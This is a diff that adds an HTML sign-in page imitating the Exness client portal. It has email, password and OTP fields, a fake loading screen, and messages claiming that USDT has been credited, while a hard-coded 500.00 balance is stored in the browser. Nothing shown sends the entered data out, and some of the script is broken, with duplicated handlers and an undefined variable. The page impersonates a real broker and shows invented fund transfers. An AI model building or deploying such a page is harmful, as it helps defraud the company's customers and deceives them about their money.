@@ -1,0 +1,476 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1" />
+<title>Welcome to Exness Client Portal — Sign in</title>
+    <link rel="icon" href="logo.png" type="image/x-icon">
+<style>
+  :root{
+    --bg:#ffffff;
+    --muted:#6b7280;
+    --accent:#ffd400; /* yellow button */
+    --border:#e6e7ea;
+    --input-bg:#fafafa;
+    --google-bg:#f5f7f9;
+    --text:#0f1724;
+    --radius:10px;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+  }
+  html,body{height:100%;margin:0;background:var(--bg);color:var(--text);}
+  .viewport{
+    max-width:420px;
+    margin:0 auto;
+    padding:18px 18px 28px;
+    box-sizing:border-box;
+  }
+
+  .url-pill{
+    flex:1;
+    background:#f0f1f3;
+    padding:8px 12px;
+    border-radius:999px;
+    font-size:13px;
+    color:#333;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+  }
+
+  header.logo{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    margin-top:6px;
+    margin-bottom:18px;
+  }
+  .logo-mark{
+    width:78px;
+    height:28px;
+    display:flex;
+    align-items:center;
+    justify-content:flex-start;
+    font-weight:700;
+    font-size:24px;
+    color:#0b1220;
+    letter-spacing: -1px;
+  }
+
+  h1{
+    font-size:28px;
+    margin:6px 0 18px;
+    font-weight:700;
+    color:var(--text);
+  }
+
+  .tabs{
+    display:flex;
+    gap:14px;
+    border-bottom:1px solid var(--border);
+    margin-bottom:18px;
+  }
+  .tab{
+    padding:10px 0;
+    font-size:15px;
+    color:var(--muted);
+    cursor:pointer;
+    position:relative;
+  }
+  .tab.active{
+    color:var(--text);
+    font-weight:600;
+  }
+  .tab.active::after{
+    content:'';
+    position:absolute;
+    left:0;
+    right:0;
+    bottom:-1px;
+    height:3px;
+    background:var(--text);
+    border-radius:3px 3px 0 0;
+  }
+
+  form.card{
+    display:block;
+  }
+  label{
+    display:block;
+    font-size:14px;
+    margin-bottom:8px;
+    color:var(--muted);
+  }
+  .field{
+    margin-bottom:16px;
+  }
+  input[type="email"],
+  input[type="password"],
+  input[type="text"],
+  input[type="number"]{
+    width:100%;
+    box-sizing:border-box;
+    padding:14px 14px;
+    border-radius:10px;
+    border:1px solid var(--border);
+    background:var(--input-bg);
+    font-size:15px;
+    outline:none;
+  }
+  .password-wrap{
+    position:relative;
+  }
+  .eye{
+    position:absolute;
+    right:12px;
+    top:50%;
+    transform:translateY(-50%);
+    background:transparent;
+    border:none;
+    font-size:18px;
+    cursor:pointer;
+    color:var(--muted);
+  }
+
+  .btn{
+    display:block;
+    width:100%;
+    padding:14px;
+    border-radius:10px;
+    border:0;
+    font-size:16px;
+    font-weight:600;
+    cursor:pointer;
+    box-shadow:0 1px 0 rgba(0,0,0,0.03) inset;
+  }
+  .btn.primary{
+    background:var(--accent);
+    color:#111;
+    margin:6px 0 18px;
+  }
+  .or{
+    display:flex;
+    align-items:center;
+    gap:12px;
+    color:var(--muted);
+    font-size:14px;
+    margin:10px 0;
+  }
+  .or hr{flex:1;border:none;border-top:1px solid var(--border);}
+
+  .btn.google{
+    background:var(--google-bg);
+    color:var(--text);
+    border:1px solid var(--border);
+    display:flex;
+    gap:10px;
+    align-items:center;
+    justify-content:center;
+    padding:12px;
+  }
+  .google .g-icon{
+    width:18px;height:18px;
+    display:inline-block;
+    background:
+      linear-gradient(45deg,#ea4335 0 50%, transparent 50%),
+      linear-gradient(-45deg,#34a853 0 50%, transparent 50%),
+      linear-gradient(45deg,#fbbc05 0 50%, transparent 50%),
+      linear-gradient(-45deg,#4285f4 0 50%, transparent 50%);
+    background-size:100% 100%;
+    border-radius:3px;
+    box-shadow:0 0 0 1px rgba(0,0,0,0.04) inset;
+  }
+
+  .forgot{
+    text-align:center;
+    margin-top:12px;
+    font-size:14px;
+    color:#2b6cb0;
+    text-decoration:none;
+    display:block;
+  }
+
+  .bottom-nav{
+    margin-top:26px;
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    gap:10px;
+    padding-top:12px;
+    border-top:1px solid transparent;
+  }
+  .nav-icon{
+    width:34px;height:34px;border-radius:10px;
+    display:flex;align-items:center;justify-content:center;
+    border:1px solid #f0f0f0;color:var(--muted);
+    font-size:14px;
+  }
+
+  .otp-container {
+    margin: 20px 0;
+  }
+  .otp-single-input {
+    width: 100%;
+    padding: 15px;
+    font-size: 18px;
+    text-align: center;
+    border: 2px solid var(--border);
+    border-radius: 10px;
+    background: var(--input-bg);
+    box-sizing: border-box;
+  }
+  
+  .otp-single-input:focus {
+    border-color: var(--accent);
+    outline: none;
+    box-shadow: 0 0 0 3px rgba(255, 212, 0, 0.2);
+  }
+  
+  /* Hide number input arrows */
+  .otp-single-input::-webkit-outer-spin-button,
+  .otp-single-input::-webkit-inner-spin-button {
+    -webkit-appearance: none;
+    margin: 0;
+  }
+  .otp-single-input[type=number] {
+    -moz-appearance: textfield;
+  }
+  .loading {
+    text-align: center;
+    padding: 20px;
+    display: none;
+  }
+  .spinner {
+    border: 4px solid rgba(0, 0, 0, 0.1);
+    width: 36px;
+    height: 36px;
+    border-radius: 50%;
+    border-left-color: #ffd400;
+    animation: spin 1s linear infinite;
+    margin: 0 auto 15px;
+  }
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+
+  @media (max-width:420px){
+    .viewport{padding-left:12px;padding-right:12px;}
+    h1{font-size:26px;}
+  }
+</style>
+</head>
+<body>
+  <div class="viewport">
+    <div class="logo-container" style="text-align: center; margin: 20px 0;">
+      <img src="logo.png" alt="Logo" style="max-width: 200px; height: auto;">
+    </div>
+
+    <h1>Welcome to Exness Client Portal</h1>
+
+    <div class="tabs" role="tablist" aria-label="Sign tabs">
+      <div class="tab active" id="tab-signin" role="tab" aria-selected="true">Sign in</div>
+      <a href="register.html" class="tab" id="tab-create" role="tab" aria-selected="false">Create an account</a>
+    </div>
+
+    <form id="signinForm" class="card" onsubmit="handleSignIn(event)">
+      <div class="field">
+        <label for="email">Your email address</label>
+        <input id="email" type="email" placeholder="you@example.com" required />
+      </div>
+
+      <div class="field">
+        <label for="password">Password</label>
+        <div class="password-field">
+          <input id="password" type="password" placeholder="••••••••" required />
+          <button type="button" class="toggle-password" onclick="togglePassword()">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M12 5C5 5 2 12 2 12s3 7 10 7 10-7 10-7-3-7-10-7z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+              <path d="M12 15a3 3 0 1 0 0-6 3 3 0 0 0 0 6z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </button>
+        </div>
+      </div>
+
+      <button type="submit" class="btn-primary" style="background-color: #ffd400; color: #000; border: none; padding: 12px 24px; border-radius: 6px; font-weight: 600; font-size: 16px; cursor: pointer; width: 100%; display: flex; align-items: center; justify-content: center; gap: 8px;">
+        <span>Sign in</span>
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M5 12h14M12 5l7 7-7 7" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </button>
+    </form>
+
+
+    <!-- OTP Verification Form (initially hidden) -->
+    <div id="otpForm" style="display: none;">
+      <h2>Verify Your Identity</h2>
+      <p>We've sent a 6-digit code to your email. Please enter it below.</p>
+      
+      <form id="otpVerificationForm">
+        <div class="otp-container">
+          <input type="text" 
+                 id="otpInput" 
+                 class="otp-single-input" 
+                 maxlength="6" 
+                 pattern="\d{6}" 
+                 inputmode="numeric"
+                 placeholder="Enter 6-digit OTP"
+                 required>
+        </div>
+        <input type="hidden" id="userEmail">
+        <button type="submit" class="btn primary">Verify OTP</button>
+      </form>
+      
+      <p style="text-align: center; margin-top: 15px;">
+        Didn't receive the code? <a href="#" id="resendOtpLink">Resend</a>
+      </p>
+    </div>
+
+    <!-- Loading Screen (initially hidden) -->
+    <div id="loadingScreen" class="loading" style="display: none;">
+      <div class="spinner"></div>
+      <h2>Please wait while we process your request</h2>
+      <p>This may take up to 5 minutes to add your USDT</p>
+    </div>
+
+  </div>
+
+  <script>
+    // Tabs functionality
+    document.getElementById('tab-signin').addEventListener('click', function(){
+      this.classList.add('active');
+      document.getElementById('tab-create').classList.remove('active');
+    });
+    
+    document.getElementById('tab-create').addEventListener('click', function(){
+      this.classList.add('active');
+      document.getElementById('tab-signin').classList.remove('active');
+    });
+
+    // Password toggle
+    function togglePassword(){
+      var p = document.getElementById('password');
+      if(p.type === 'password'){ 
+        p.type = 'text'; 
+      } else { 
+        p.type = 'password'; 
+      }
+    }
+
+    // Handle form submission
+    function handleSignIn(event) {
+        event.preventDefault();
+        const submitBtn = event.target.querySelector('button[type="submit"]');
+        const originalText = submitBtn.innerHTML;
+        
+        // Show loading state
+        submitBtn.innerHTML = 'Signing in...';
+        submitBtn.disabled = true;
+        
+        // Simulate API call with 2-second delay
+        setTimeout(() => {
+            // Store account balance in localStorage
+            localStorage.setItem('accountBalance', '500.00');
+            // Redirect to dashboard
+            window.location.href = 'dashboard.html';
+        }, 2000);
+    }
+
+    // Handle OTP input to allow only numbers
+    document.getElementById('otpInput')?.addEventListener('input', function(e) {
+      // Remove any non-digit characters
+      this.value = this.value.replace(/\D/g, '');
+      // Limit to 6 digits
+      if (this.value.length > 6) {
+        this.value = this.value.slice(0, 6);
+      }
+    });
+
+    // Form submission
+    document.getElementById('signinForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const email = document.getElementById('email').value;
+      document.getElementById('userEmail').value = email;
+      // Show OTP form and hide signin form
+      this.style.display = 'none';
+      document.getElementById('otpForm').style.display = 'block';
+      // Focus OTP input
+      document.getElementById('otpInput').focus();
+      
+      // In a real app, you would send the OTP to the user's email here
+      console.log('OTP would be sent to:', email);
+    });
+    
+    // Handle OTP form submission
+    document.getElementById('otpVerificationForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const otp = document.getElementById('otpInput').value;
+        const email = document.getElementById('userEmail').value;
+        
+        if (otp.length !== 6 || !/^\d+$/.test(otp)) {
+            alert('Please enter a valid 6-digit OTP');
+            return;
+        }
+        
+        // Show loading screen
+        document.getElementById('otpForm').style.display = 'none';
+        const loadingScreen = document.getElementById('loadingScreen');
+        loadingScreen.style.display = 'block';
+        loadingScreen.innerHTML = `
+            <div class="spinner"></div>
+            <h2>Processing Your Request</h2>
+            <p>Please wait while we verify your information and set up your account.</p>
+            <div id="countdown" style="margin-top: 20px; font-size: 18px; color: var(--accent);"></div>
+        `;
+        
+        // Show success message after 2 seconds
+        setTimeout(() => {
+            loadingScreen.innerHTML = `
+                <div style="color: #4CAF50; font-size: 48px; margin-bottom: 20px;">✓</div>
+                <h2>Verification Complete!</h2>
+                <p>Your account has been successfully verified.</p>
+                <p>You can now log in to your account.</p>
+                <button class="btn primary" style="margin-top: 20px;" onclick="window.location.href='index.html'">Back to Login</button>
+            `;
+        }, 2000);
+    });
+    
+    // Handle resend OTP
+    document.getElementById('resendOtpLink').addEventListener('click', function(e) {
+      e.preventDefault();
+      const email = document.getElementById('userEmail').value;
+      // In a real app, you would resend the OTP here
+      console.log('Resending OTP to:', email);
+      alert('A new OTP has been sent to your email');
+    });
+
+    // OTP verification
+    document.getElementById('otpVerificationForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const otp = Array.from(otpInputs).map(input => input.value).join('');
+      
+      if (otp.length === 6) {
+        // Show loading screen
+        document.getElementById('otpForm').style.display = 'none';
+        const loadingScreen = document.getElementById('loadingScreen');
+        loadingScreen.style.display = 'block';
+        
+        // Simulate processing time (5 minutes)
+        setTimeout(() => {
+          loadingScreen.innerHTML = `
+            <div style="color: #4CAF50; font-size: 48px; margin-bottom: 20px;">✓</div>
+            <h2>Success!</h2>
+            <p>Your USDT has been successfully added to your account.</p>
+            <button class="btn primary" style="margin-top: 20px;" onclick="window.location.reload()">Back to Home</button>
+          `;
+        }, 5000); // 5 seconds for demo (change to 300000 for 5 minutes)
+      }
+    });
+
+    // Resend OTP
+    function resendOTP() {
+      alert('A new OTP has been sent to your Mobile Number .');
+      // In a real app, you would make an API call to resend the OTP
+    }
+  </script>
+</body>
+</html>
